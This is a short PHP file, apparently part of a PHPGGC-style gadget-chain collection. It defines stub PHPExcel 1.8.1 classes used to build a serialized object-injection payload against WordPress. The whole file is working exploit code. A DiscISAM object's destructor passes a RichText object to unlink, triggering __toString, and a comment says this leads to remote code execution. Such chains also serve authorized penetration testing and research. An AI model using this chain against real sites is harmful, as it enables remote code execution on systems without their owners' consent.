<?php

require_once(DIR_GADGETCHAINS . '/WordPress/generic/gadgets.php');

# https://github.com/PHPOffice/PHPExcel/blob/1.8.1/Classes/PHPExcel/RichText.php
class PHPExcel_RichText {
    private $_richTextElements;

    public function __construct($richTextElements) {
        $this->_richTextElements = $richTextElements;
    }

    /*
    public function getPlainText() {
        // Return value
        $returnValue = '';

        // Loop through all PHPExcel_RichText_ITextElement
        foreach ($this->_richTextElements as $text) {
            $returnValue .= $text->getText();
        }

        // Return
        return $returnValue;
    }

    public function __toString() {
        return $this->getPlainText();
    }
    */
}

# https://github.com/PHPOffice/PHPExcel/blob/1.8.1/Classes/PHPExcel/CachedObjectStorage/DiscISAM.php
class PHPExcel_CachedObjectStorage_DiscISAM {
    private $_fileName = null;
    private $_fileHandle = 42;

    public function __construct($filePath) {
        $this->_fileName = $filePath;
    }

    /*
    public function __destruct() {
        if (!is_null($this->_fileHandle)) {
            fclose($this->_fileHandle); // Will only produce a warning
            unlink($this->_fileName); // Passing an object will call its __toString(), triggering the RCE
        }
        $this->fileHandle = null;
    }
    */
}